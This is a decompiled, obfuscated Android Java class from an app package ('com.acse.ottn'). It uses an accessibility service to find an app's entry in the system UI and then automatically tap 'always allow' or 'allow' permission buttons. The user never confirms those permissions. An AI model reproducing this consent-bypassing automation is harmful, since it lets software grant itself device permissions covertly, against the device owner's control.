package com.acse.ottn.p042d.p044b;

import android.accessibilityservice.AccessibilityService;
import android.view.accessibility.AccessibilityNodeInfo;
import com.acse.ottn.util.C1648S;
import com.acse.ottn.util.C1652V;
import com.acse.ottn.util.C1661ba;
import com.acse.ottn.util.C1684n;
import com.acse.ottn.util.C1694ra;
import java.util.TimerTask;

/* JADX INFO: Access modifiers changed from: package-private */
/* renamed from: com.acse.ottn.d.b.k */
/* loaded from: E:\fuckcool\tsn\6276784.dex */
public class C1508k implements C1648S.InterfaceC1649a {

    /* renamed from: a */
    final /* synthetic */ String f2777a;

    /* renamed from: b */
    final /* synthetic */ AccessibilityService f2778b;

    /* JADX INFO: Access modifiers changed from: package-private */
    public C1508k(String str, AccessibilityService accessibilityService) {
        this.f2777a = str;
        this.f2778b = accessibilityService;
    }

    @Override // com.acse.ottn.util.C1648S.InterfaceC1649a
    /* renamed from: a */
    public void mo55884a(long j) {
        AccessibilityNodeInfo accessibilityNodeInfo;
        AccessibilityNodeInfo accessibilityNodeInfo2;
        C1694ra.m55917a("samon-->", "clickHouTaiShowPage倒计时");
        try {
            if (this.f2777a == null) {
                return;
            }
            AccessibilityNodeInfo m55955g = C1684n.m55975c().m55955g(this.f2778b, this.f2777a);
            if (m55955g == null) {
                C1694ra.m55917a("samonp-->", "appNodeInfo is null");
                C1509l.m56567i(this.f2778b);
                accessibilityNodeInfo = C1509l.f2782d;
                if (accessibilityNodeInfo != null) {
                    C1684n m55975c = C1684n.m55975c();
                    accessibilityNodeInfo2 = C1509l.f2782d;
                    m55975c.m55978b(accessibilityNodeInfo2);
                    return;
                }
                return;
            }
            C1694ra.m55917a("samonp-->", "appNodeInfo is not null");
            TimerTask timerTask = C1509l.f2781c;
            if (timerTask != null) {
                timerTask.cancel();
                C1509l.f2781c = null;
            }
            C1694ra.m55917a("acse_MiuiUtils", "找到了");
            C1684n.m55975c().m55958f(m55955g);
            C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(500));
            AccessibilityNodeInfo m55951j = C1684n.m55975c().m55951j(this.f2778b, "始终允许");
            AccessibilityNodeInfo m55951j2 = C1684n.m55975c().m55951j(this.f2778b, "允许");
            if (m55951j != null) {
                C1694ra.m55917a("samonp-->", "appinfo is not null");
                C1684n.m55975c().m55958f(m55951j);
                C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(200));
                C1684n.m55975c().m55969d(this.f2778b);
            } else if (m55951j2 != null) {
                C1684n.m55975c().m55958f(m55951j2);
                C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(200));
                C1684n.m55975c().m55969d(this.f2778b);
                C1694ra.m55917a("samonp-->", "appinfo1 is not null");
            }
            if (C1661ba.m56097a().m56096a("is_pengpai")) {
                C1684n.m55975c().m55969d(this.f2778b);
                C1684n.m55975c().m56005a(C1652V.m56140a().m56132b(100));
                C1684n.m55975c().m55969d(this.f2778b);
            }
        } catch (Exception e) {
            C1694ra.m55917a("acse_MiuiUtils", "e =" + e.getMessage());
        }
    }

    @Override // com.acse.ottn.util.C1648S.InterfaceC1649a
    public void onFinish() {
        C1509l.f2781c = null;
    }
}
